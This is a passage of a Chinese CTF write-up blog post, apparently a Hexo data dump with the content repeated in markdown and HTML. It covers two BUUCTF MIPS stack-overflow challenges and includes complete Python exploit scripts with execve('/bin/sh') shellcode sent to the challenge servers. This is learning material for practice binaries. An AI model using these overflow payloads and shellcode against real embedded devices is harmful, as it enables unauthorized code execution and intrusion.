ASLR,所以我们可以往栈上,写shellcode,栈地址空间每次也都是一样的.所以非常好绕,不用泄露信息什么的.\n\n但是,因为远程环境和本地环境的区别,远程和本地的地址空间不一定一样.所以远程还是不能直接这么打.继续看题\n\n### ida分析\n\n![mian函数](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250814152019651.png)\n\n非常简单的程序,没有什么利用点,看`vuln()`\n\n![vuln函数](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250814152120201.png)\n\n发现溢出漏洞了，可以修改返回地址，但是要看汇编确定`$ra`的位置。\n\n![vuln函数汇编](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250814152621302.png)\n\n说真的，有的时候看汇编比看伪代码好。通过这个代码段，我们也可以了解到mips架构调用函数的一个流程。\n\n进入之后，先把`$sp`往上移动0x40,然后分别把`$ra`和`$fp`放在`$sp+0x3c`和`$sp+0x38` 的位置.\n\n在read时,会往`$sp+0x18`的位置读入0x200字节.所以输入`0x20`字节数据后就可以覆盖`$fp`和`$ra`.\n\n### 思路分析\n\n1. 之前说过可以直接写shellcode在栈上,然后把返回地址设置成栈上的地址就可以了,这个在本地完全可以这么打,但是远程的栈地址和本地会不一样,也不要想着爆破.\n2. 所以,我们转换思路,通过返回到read 函数,把shellcode 写到bss段上,在返回到bss段上执行,也是非常简便的方法.\n3. 如何控制read 的buf呢?在`0x40080c`的位置,有两条指令,分别是从栈上取出保存的`$fp`和`$ra`,那么只要我们覆盖到这里,就可以控制,取出来之后的这两个寄存器. 同时注意到read 是通过`$fp`来计算buf 的,所以控制了`$fp`,就控制了buf.\n4. 那么如何控制程序跳转到shllcode呢?或者说,第二次的返回地址应该写在哪呢?因为`$fp`和`$ra`都是通过`$sp`寻找的,所以要特别关注`$sp`的变化,发现在read的结束之后又一条指令`move $sp, $fp` ,这会是`$sp`移到`$fp`的位置,所以第二次的返回地址,写在第二次的payload里,计算好偏移即可.\n\n### exp\n\n```python\nfrom esy import *\ncontext.log_level=\"debug\"\ncontext.arch=\"mips\"\n#io=process([\"qemu-mipsel\",\"-L\",\"/home/tsq/Desktop/iot/DIR-815/_DIR-815.bin.extracted/squashfs-root/\",\"-g\",\"1234\",\"./pwn\"])\nio=remote(\"node5.buuoj.cn\",26700)\n\nname=\"a\"*0x14\npayload=b\"a\"*0x20+p32(0x00410B80+0x18)+p32(0x004007E0)\nshellcode=asm('''\naddiu $sp, -0x40\nli $t7, 0x69622f2f\nsw $t7, -12($sp)\nli $t6, 0x68732f6e\nsw $t6, -8($sp)\nsw $zero, -4($sp)\nla $a0, -12($sp)\nli $v0, 4011\nmove $a1, $zero\nmove $a2, $zero\nsyscall\nnop\n''')\n\nprint(len(shellcode))\n\nio.sendafter(\"name: \\n\",name)\nsleep(3)\nio.send(payload)\npayload=b\"a\"*0x24+p32(0x00410Bb0+0x28)+shellcode\nio.send(payload)\n\nio.interactive()\n\n```\n\n## ycb_2020_mipspwn\n\n一回生,二回熟.再次看到同样,或者类似的read就非常得心应手\n\n### ida分析\n\n![main函数](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250814164722957.png)\n\n表面上是一个菜单,实际上核心只有description ,直接点进去看\n\n![description](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250814164826325.png)\n\n继续\n\n![vul汇编](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250814164919324.png)\n\n直接看汇编,除了偏移不一样,没有任何变化.和上一道题完全一样的方法\n\n### 思路分析\n\n1. 那我们想如何快速的计算出偏移呢?首先要确定fp 和 ra 的偏移,分别是0x50 和 0x54, 直接可以出来.然后是buf 的偏移,0x18.可以通过ida 反汇编看出来.\n2. 所以要写0x38的垃圾数据.所以如果都用0x50+var_xxx这种形式,直接看buf,这里xxx是多少,就是写多少垃圾数据.非常快速的找到偏移.\n3. 第二次shellcode 的偏移 也很好找.假设你第一次payload 设置的fp 是 bss_addr.那么第二次返回地址就是`p32(bss_add+0x18+0x40)`\n4. 0x18 是, read时 的偏移. 0x40 是,前面的垃圾数据,假设这个地址本身的长度.因为我们都会把shellcode 写在这个地址的后面.\n\n### exp\n\n```python\nfrom esy import *\ncontext.log_level=\"debug\"\ncontext.arch=\"mips\"\n#io=process([\"qemu-mipsel\",\"-g\",\"1234\",\"./pwn\"])\nio=remote(\"node5.buuoj.cn\",26779)\n\ndef menu(op):\n\tio.sendlineafter(\"choice: \",str(op))\nbss=0x004115F0\nname=b\"a\"*4\npayload=b\"a\"*0x38+p32(bss+0x10)+p32(0x00400F50)\nshellcode=asm('''\naddiu $sp, -0x40\nli $t7, 0x69622f2f\nsw $t7, -12($sp)\nli $t6, 0x68732f6e\nsw $t6, -8($sp)\nsw $zero, -4($sp)\nla $a0, -12($sp)\nli $v0, 4011\nmove $a1, $zero\nmove $a2, $zero\nsyscall\nnop\n''')\n\nio.sendafter(\"here:\\n\",name)\nmenu(7)\nio.sendafter(\"feeling:\",payload)\n\n\npayload=b\"a\"*0x3c+p32(bss+0x10+0x18+0x40)+shellcode\nio.send(payload)\n\nio.interactive()\n\n```\n\n## 后记\n\n写两道题,对mips下的程序的一个调用一下就开朗了.对shellcode ,寄存器的运用也提高了,还是收获不小.这两道题上手也是非常的快. \n\n不过第一道题似乎需要uClibc,我是之前分析DIR-815固件时,binwalk提取出来这个libc ,我就直接用了.\n\n第二道题直接给了uClibc,可以直接写.","slug":"异架构/mips题目练习","published":1,"date":"2025-08-14T10:11:10.264Z","updated":"2025-09-02T15:53:50.540Z","comments":1,"layout":"post","photos":[],"_id":"cmglxf2in0041uomy678z1x4a","content":"<h1 id=\"mips-题目练习\"><a href=\"#mips-题目练习\" class=\"headerlink\" title=\"mips-题目练习\"></a>mips-题目练习</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>上次学mips的时候就打算在buuctf上写两道题目看看效果，巩固一下。但是当天buuctf不知道怎么回事，g掉了。写不了题目了，直到现在，才有时间写这两道题目。</p>\n<p>这两道题目应该也是非常经典了，网上有很多对这个的分析，题解。mips的前置知识呢写在了其他博客里面，在这里就啰嗦了。直接上题目。</p>\n<h2 id=\"axb-2019-mips\"><a href=\"#axb-2019-mips\" class=\"headerlink\" title=\"axb_2019_mips\"></a>axb_2019_mips</h2><p>这是一道<code>ret2shellcode</code> 的题目，非常的经典. 因为mips架构,不会开启NX 和 ASLR,所以我们可以往栈上,写shellcode,栈地址空间每次也都是一样的.所以非常好绕,不用泄露信息什么的.</p>\n<p>但是,因为远程环境和本地环境的区别,远程和本地的地址空间不一定一样.所以远程还是不能直接这么打.继续看题</p>\n<h3 id=\"ida分析\"><a href=\"#ida分析\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250814152019651.png\" alt=\"mian函数\"></p>\n<p>非常简单的程序,没有什么利用点,看<code>vuln()</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250814152120201.png\" alt=\"vuln函数\"></p>\n<p>发现溢出漏洞了，可以修改返回地址，但是要看汇编确定<code>$ra</code>的位置。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250814152621302.png\" alt=\"vuln函数汇编\"></p>\n<p>说真的，有的时候看汇编比看伪代码好。通过这个代码段，我们也可以了解到mips架构调用函数的一个流程。</p>\n<p>进入之后，先把<code>$sp</code>往上移动0x40,然后分别把<code>$ra</code>和<code>$fp</code>放在<code>$sp+0x3c</code>和<code>$sp+0x38</code> 的位置.</p>\n<p>在read时,会往<code>$sp+0x18</code>的位置读入0x200字节.所以输入<code>0x20</code>字节数据后就可以覆盖<code>$fp</code>和<code>$ra</code>.</p>\n<h3 id=\"思路分析\"><a href=\"#思路分析\" class=\"headerlink\" title=\"思路分析\"></a>思路分析</h3><ol>\n<li>之前说过可以直接写shellcode在栈上,然后把返回地址设置成栈上的地址就可以了,这个在本地完全可以这么打,但是远程的栈地址和本地会不一样,也不要想着爆破.</li>\n<li>所以,我们转换思路,通过返回到read 函数,把shellcode 写到bss段上,在返回到bss段上执行,也是非常简便的方法.</li>\n<li>如何控制read 的buf呢?在<code>0x40080c</code>的位置,有两条指令,分别是从栈上取出保存的<code>$fp</code>和<code>$ra</code>,那么只要我们覆盖到这里,就可以控制,取出来之后的这两个寄存器. 同时注意到read 是通过<code>$fp</code>来计算buf 的,所以控制了<code>$fp</code>,就控制了buf.</li>\n<li>那么如何控制程序跳转到shllcode呢?或者说,第二次的返回地址应该写在哪呢?因为<code>$fp</code>和<code>$ra</code>都是通过<code>$sp</code>寻找的,所以要特别关注<code>$sp</code>的变化,发现在read的结束之后又一条指令<code>move $sp, $fp</code> ,这会是<code>$sp</code>移到<code>$fp</code>的位置,所以第二次的返回地址,写在第二次的payload里,计算好偏移即可.</li>\n</ol>\n<h3 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> esy <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level=<span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\">context.arch=<span class=\"string\">&quot;mips&quot;</span></span><br><span class=\"line\"><span class=\"comment\">#io=process([&quot;qemu-mipsel&quot;,&quot;-L&quot;,&quot;/home/tsq/Desktop/iot/DIR-815/_DIR-815.bin.extracted/squashfs-root/&quot;,&quot;-g&quot;,&quot;1234&quot;,&quot;./pwn&quot;])</span></span><br><span class=\"line\">io=remote(<span class=\"string\">&quot;node5.buuoj.cn&quot;</span>,<span class=\"number\">26700</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">name=<span class=\"string\">&quot;a&quot;</span>*<span class=\"number\">0x14</span></span><br><span class=\"line\">payload=<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">0x20</span>+p32(<span class=\"number\">0x00410B80</span>+<span class=\"number\">0x18</span>)+p32(<span class=\"number\">0x004007E0</span>)</span><br><span class=\"line\">shellcode=asm(<span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">addiu $sp, -0x40</span></span><br><span class=\"line\"><span class=\"string\">li $t7, 0x69622f2f</span></span><br><span class=\"line\"><span class=\"string\">sw $t7, -12($sp)</span></span><br><span class=\"line\"><span class=\"string\">li $t6, 0x68732f6e</span></span><br><span class=\"line\"><span class=\"string\">sw $t6, -8($sp)</span></span><br><span class=\"line\"><span class=\"string\">sw $zero, -4($sp)</span></span><br><span class=\"line\"><span class=\"string\">la $a0, -12($sp)</span></span><br><span class=\"line\"><span class=\"string\">li $v0, 4011</span></span><br><span class=\"line\"><span class=\"string\">move $a1, $zero</span></span><br><span class=\"line\"><span class=\"string\">move $a2, $zero</span></span><br><span class=\"line\"><span class=\"string\">syscall</span></span><br><span class=\"line\"><span class=\"string\">nop</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">len</span>(shellcode))</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;name: \\n&quot;</span>,name)</span><br><span class=\"line\">sleep(<span class=\"number\">3</span>)</span><br><span class=\"line\">io.send(payload)</span><br><span class=\"line\">payload=<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">0x24</span>+p32(<span class=\"number\">0x00410Bb0</span>+<span class=\"number\">0x28</span>)+shellcode</span><br><span class=\"line\">io.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ycb-2020-mipspwn\"><a href=\"#ycb-2020-mipspwn\" class=\"headerlink\" title=\"ycb_2020_mipspwn\"></a>ycb_2020_mipspwn</h2><p>一回生,二回熟.再次看到同样,或者类似的read就非常得心应手</p>\n<h3 id=\"ida分析-1\"><a href=\"#ida分析-1\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250814164722957.png\" alt=\"main函数\"></p>\n<p>表面上是一个菜单,实际上核心只有description ,直接点进去看</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250814164826325.png\" alt=\"description\"></p>\n<p>继续</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250814164919324.png\" alt=\"vul汇编\"></p>\n<p>直接看汇编,除了偏移不一样,没有任何变化.和上一道题完全一样的方法</p>\n<h3 id=\"思路分析-1\"><a href=\"#思路分析-1\" class=\"headerlink\" title=\"思路分析\"></a>思路分析</h3><ol>\n<li>那我们想如何快速的计算出偏移呢?首先要确定fp 和 ra 的偏移,分别是0x50 和 0x54, 直接可以出来.然后是buf 的偏移,0x18.可以通过ida 反汇编看出来.</li>\n<li>所以要写0x38的垃圾数据.所以如果都用0x50+var_xxx这种形式,直接看buf,这里xxx是多少,就是写多少垃圾数据.非常快速的找到偏移.</li>\n<li>第二次shellcode 的偏移 也很好找.假设你第一次payload 设置的fp 是 bss_addr.那么第二次返回地址就是<code>p32(bss_add+0x18+0x40)</code></li>\n<li>0x18 是, read时 的偏移. 0x40 是,前面的垃圾数据,假设这个地址本身的长度.因为我们都会把shellcode 写在这个地址的后面.</li>\n</ol>\n<h3 id=\"exp-1\"><a href=\"#exp-1\" class=\"headerlink\" title=\"exp\"></a>exp</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> esy <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level=<span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\">context.arch=<span class=\"string\">&quot;mips&quot;</span></span><br><span class=\"line\"><span class=\"comment\">#io=process([&quot;qemu-mipsel&quot;,&quot;-g&quot;,&quot;1234&quot;,&quot;./pwn&quot;])</span></span><br><span class=\"line\">io=remote(<span class=\"string\">&quot;node5.buuoj.cn&quot;</span>,<span class=\"number\">26779</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">menu</span>(<span class=\"params\">op</span>):</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&quot;choice: &quot;</span>,<span class=\"built_in\">str</span>(op))</span><br><span class=\"line\">bss=<span class=\"number\">0x004115F0</span></span><br><span class=\"line\">name=<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">4</span></span><br><span class=\"line\">payload=<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">0x38</span>+p32(bss+<span class=\"number\">0x10</span>)+p32(<span class=\"number\">0x00400F50</span>)</span><br><span class=\"line\">shellcode=asm(<span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">addiu $sp, -0x40</span></span><br><span class=\"line\"><span class=\"string\">li $t7, 0x69622f2f</span></span><br><span class=\"line\"><span class=\"string\">sw $t7, -12($sp)</span></span><br><span class=\"line\"><span class=\"string\">li $t6, 0x68732f6e</span></span><br><span class=\"line\"><span class=\"string\">sw $t6, -8($sp)</span></span><br><span class=\"line\"><span class=\"string\">sw $zero, -4($sp)</span></span><br><span class=\"line\"><span class=\"string\">la $a0, -12($sp)</span></span><br><span class=\"line\"><span class=\"string\">li $v0, 4011</span></span><br><span class=\"line\"><span class=\"string\">move $a1, $zero</span></span><br><span class=\"line\"><span class=\"string\">move $a2, $zero</span></span><br><span class=\"line\"><span class=\"string\">syscall</span></span><br><span class=\"line\"><span class=\"string\">nop</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;here:\\n&quot;</span>,name)</span><br><span class=\"line\">menu(<span class=\"number\">7</span>)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;feeling:&quot;</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">payload=<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">0x3c</span>+p32(bss+<span class=\"number\">0x10</span>+<span class=\"number\">0x18</span>+<span class=\"number\">0x40</span>)+shellcode</span><br><span class=\"line\">io.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h2><p>写两道题,对mips下的程序的一个调用一下就开朗了.对shellcode ,寄存器的运用也提高了,还是收获不小.这两道题上手也是非常的快. </p>\n<p>不过第一道题似乎需要uClibc,我是之前分析DIR-815固件时,binwalk提取出来这个libc ,我就直接用了.</p>\n<p>第二道题直接给了uClibc,可以直接写.</p>\n","excerpt":"","more":"<h1 id=\"mips-题目练习\"><a href=\"#mips-题目练习\" class=\"headerlink\" title=\"mips-题目练习\"></a>mips-题目练习</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>上次学mips的时候就打算在buuctf上写两道题目看看效果，巩固一下。但是当天buuctf不知道怎么回事，g掉了。写不了题目了，直到现在，才有时间写这两道题目。</p>\n<p>这两道题目应该也是非常经典了，网上有很多对这个的分析，题解。mips的前置知识呢写在了其他博客里面，在这里就啰嗦了。直接上题目。</p>\n<h2 id=\"axb-2019-mips\"><a href=\"#axb-2019-mips\" class=\"headerlink\" title=\"axb_2019_mips\"></a>axb_2019_mips</h2><p>这是一道<code>ret2shellcode</code> 的题目，非常的经典. 因为mips架构,不会开启NX 和 ASLR,所以我们可以往栈上,写shellcode,栈地址空间每次也都是一样的.所以非常好绕,不用泄露信息什么的.</p>\n<p>但是,因为远程环境和本地环境的区别,远程和本地的地址空间不一定一样.所以远程还是不能直接这么打.继续看题</p>\n<h3 id=\"ida分析\"><a href=\"#ida分析\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250814152019651.png\" alt=\"mian函数\"></p>\n<p>非常简单的程序,没有什么利用点,看<code>vuln()</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250814152120201.png\" alt=\"vuln函数\"></p>\n<p>发现溢出漏洞了，可以修改返回地址，但是要看汇编确定<code>$ra</code>的位置。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250814152621302.png\" alt=\"vuln函数汇编\"></p>\n<p>说真的，有的时候看汇编比看伪代码好。通过这个代码段，我们也可以了解到mips架构调用函数的一个流程。</p>\n<p>进入之后，先把<code>$sp</code>往上移动0x40,然后分别把<code>$ra</code>和<code>$fp</code>放在<code>$sp+0x3c</code>和<code>$sp+0x38</code> 的位置.</p>\n<p>在read时,会往<code>$sp+0x18</code>的位置读入0x200字节.所以输入<code>0x20</code>字节数据后就可以覆盖<code>$fp</code>和<code>$ra</code>.</p>\n<h3 id=\"思路分析\"><a href=\"#思路分析\" class=\"headerlink\" title=\"思路分析\"></a>思路分析</h3><ol>\n<li>之前说过可以直接写shellcode在栈上,然后把返回地址设置成栈上的地址就可以了,这个在本地完全可以这么打,但是远程的栈地址和本地会不一样,也不要想着爆破.</li>\n<li>所以,我们转换思路,通过返回到read 函数,把shellcode 写到bss段上,在返回到bss段上执行,也是非常简便的方法.</li>\n<li>如何控制read 的buf呢?在<code>0x40080c</code>的位置,有两条指令,分别是从栈上取出保存的<code>$fp</code>和<code>$ra</code>,那么只要我们覆盖到这里,就可以控制,取出来之后的这两个寄存器. 同时注意到read 是通过<code>$fp</code>来计算buf 的,所以控制了<code>$fp</code>,就控制了buf.</li>\n<li>那么如何控制程序跳转到shllcode呢?或者说,第二次的返回地址应该写在哪呢?因为<code>$fp</code>和<code>$ra</code>都是通过<code>$sp</code>寻找的,所以要特别关注<code>$sp</code>的变化,发现在read的结束之后又一条指令<code>move $sp, $fp</code> ,这会是<code>$sp</code>移到<code>$fp</code>的位置,所以第二次的返回地址,写在第二次的payload里,计算好偏移即可.</li>\n</ol>\n<h3 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> esy <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level=<span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\">context.arch=<span class=\"string\">&quot;mips&quot;</span></span><br><span class=\"line\"><span class=\"comment\">#io=process([&quot;qemu-mipsel&quot;,&quot;-L&quot;,&quot;/home/tsq/Desktop/iot/DIR-815/_DIR-815.bin.extracted/squashfs-root/&quot;,&quot;-g&quot;,&quot;1234&quot;,&quot;./pwn&quot;])</span></span><br><span class=\"line\">io=remote(<span class=\"string\">&quot;node5.buuoj.cn&quot;</span>,<span class=\"number\">26700</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">name=<span class=\"string\">&quot;a&quot;</span>*<span class=\"number\">0x14</span></span><br><span class=\"line\">payload=<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">0x20</span>+p32(<span class=\"number\">0x00410B80</span>+<span class=\"number\">0x18</span>)+p32(<span class=\"number\">0x004007E0</span>)</span><br><span class=\"line\">shellcode=asm(<span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">addiu $sp, -0x40</span></span><br><span class=\"line\"><span class=\"string\">li $t7, 0x69622f2f</span></span><br><span class=\"line\"><span class=\"string\">sw $t7, -12($sp)</span></span><br><span class=\"line\"><span class=\"string\">li $t6, 0x68732f6e</span></span><br><span class=\"line\"><span class=\"string\">sw $t6, -8($sp)</span></span><br><span class=\"line\"><span class=\"string\">sw $zero, -4($sp)</span></span><br><span class=\"line\"><span class=\"string\">la $a0, -12($sp)</span></span><br><span class=\"line\"><span class=\"string\">li $v0, 4011</span></span><br><span class=\"line\"><span class=\"string\">move $a1, $zero</span></span><br><span class=\"line\"><span class=\"string\">move $a2, $zero</span></span><br><span class=\"line\"><span class=\"string\">syscall</span></span><br><span class=\"line\"><span class=\"string\">nop</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">len</span>(shellcode))</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;name: \\n&quot;</span>,name)</span><br><span class=\"line\">sleep(<span class=\"number\">3</span>)</span><br><span class=\"line\">io.send(payload)</span><br><span class=\"line\">payload=<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">0x24</span>+p32(<span class=\"number\">0x00410Bb0</span>+<span class=\"number\">0x28</span>)+shellcode</span><br><span class=\"line\">io.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ycb-2020-mipspwn\"><a href=\"#ycb-2020-mipspwn\" class=\"headerlink\" title=\"ycb_2020_mipspwn\"></a>ycb_2020_mipspwn</h2><p>一回生,二回熟.再次看到同样,或者类似的read就非常得心应手</p>\n<h3 id=\"ida分析-1\"><a href=\"#ida分析-1\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250814164722957.png\" alt=\"main函数\"></p>\n<p>表面上是一个菜单,实际上核心只有description ,直接点进去看</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250814164826325.png\" alt=\"description\"></p>\n<p>继续</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250814164919324.png\" alt=\"vul汇编\"></p>\n<p>直接看汇编,除了偏移不一样,没有任何变化.和上一道题完全一样的方法</p>\n<h3 id=\"思路分析-1\"><a href=\"#思路分析-1\" class=\"headerlink\" title=\"思路分析\"></a>思路分析</h3><ol>\n<li>那我们想如何快速的计算出偏移呢?首先要确定fp 和 ra 的偏移,分别是0x50 和 0x54, 直接可以出来.然后是buf 的偏移,0x18.可以通过ida 反汇编看出来.</li>\n<li>所以要写0x38的垃圾数据.所以如果都用0x50+var_xxx这种形式,直接看buf,这里xxx是多少,就是写多少垃圾数据.非常快速的找到偏移.</li>\n<li>第二次shellcode 的偏移 也很好找.假设你第一次payload 设置的fp 是 bss_addr.那么第二次返回地址就是<code>p32(bss_add+0x18+0x40)</code></li>\n<li>0x18 是, read时 的偏移. 0x40 是,前面的垃圾数据,假设这个地址本身的长度.因为我们都会把shellcode 写在这个地址的后面.</li>\n</ol>\n<h3 id=\"exp-1\"><a href=\"#exp-1\" class=\"headerlink\" title=\"exp\"></a>exp</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> esy <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level=<span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\">context.arch=<span class=\"string\">&quot;mips&quot;</span></span><br><span class=\"line\"><span class=\"comment\">#io=process([&quot;qemu-mipsel&quot;,&quot;-g&quot;,&quot;1234&quot;,&quot;./pwn&quot;])</span></span><br><span class=\"line\">io=remote(<span class=\"string\">&quot;node5.buuoj.cn&quot;</span>,<span class=\"number\">26779</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">menu</span>(<span class=\"params\">op</span>):</span><br><span class=\"line\">\tio.sendlineafter(<span 